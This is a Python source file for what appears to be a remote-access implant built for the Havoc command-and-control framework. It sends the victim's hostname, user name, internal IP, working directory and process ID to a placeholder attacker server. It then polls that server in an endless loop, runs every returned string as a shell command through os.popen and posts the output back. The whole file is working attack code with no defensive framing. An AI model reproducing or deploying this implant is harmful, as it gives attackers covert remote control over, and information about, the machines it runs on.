import requests
import json
import socket
import time
import os
import sys
import random
import string
import platform

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

url = 'http://ip:port/URI'
magic = b"\x41\x41\x41\x41"
agentid = get_random_string(4).encode('utf-8')
agentdata = b"lol"*5
agentheader = magic + agentid
sleeptime = 1
if platform.machine().endswith('64'):
    arch = "x64"
else:
    arch = "x86"
registered = ""
outputdata = ""
def register():
    global url
    global size
    global agentid
    global magic
                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]
    hostname = socket.gethostname()
    registerdict = {
    "AgentID": str(agentid),
    "Hostname": hostname,
    "Username": os.getlogin(),
    "Domain": "",
    "InternalIP": socket.gethostbyname(hostname),
    "Process Path": os.getcwd(),
    "Process ID": str(os.getpid()),
    "Process Parent ID": "0",
    "Process Arch": "x64",
    "Process Elevated": 0,
    "OS Build": "NOT IMPLEMENTED YET",
    "OS Arch": arch,
    "Sleep": 1,
    "Process Name": "python",
    "OS Version": str(platform.version())
    }
    registerblob = json.dumps(registerdict)


    requestdict = {"task":"register","data":registerblob}
    requestblob = json.dumps(requestdict)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentheader = size_bytes + magic + agentid
    print("[?] trying to register the agent")
    x = requests.post(url, data=agentheader+requestblob.encode("utf-8"))
    return str(x.text)


def checkin(data):
    print("Checking in for taskings")
    requestdict = {"task":"gettask","data":data}
    requestblob = json.dumps(requestdict)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentheader = size_bytes + magic + agentid
    x = requests.post(url, data=agentheader+requestblob.encode("utf-8"))
    if len(x.text) > 0:
        print("Havoc response: " + x.text)
    return x.text

#register the agent
while registered != "registered":
    registered = register()

print("REGISTERED!")

def runcommand(command):
    command = command.strip("\x00")
    if command == "goodbye":
        sys.exit(2)
    output = os.popen(command).read() + "\n"
    return output
#checkin for commands
while True:
    commands = checkin(outputdata)
    outputdata = ""
    if len(commands) > 4:
        commandsarray = commands.split(commands[0:4])
        for x in commandsarray:
            outputdata += runcommand(x)

    time.sleep(sleeptime)

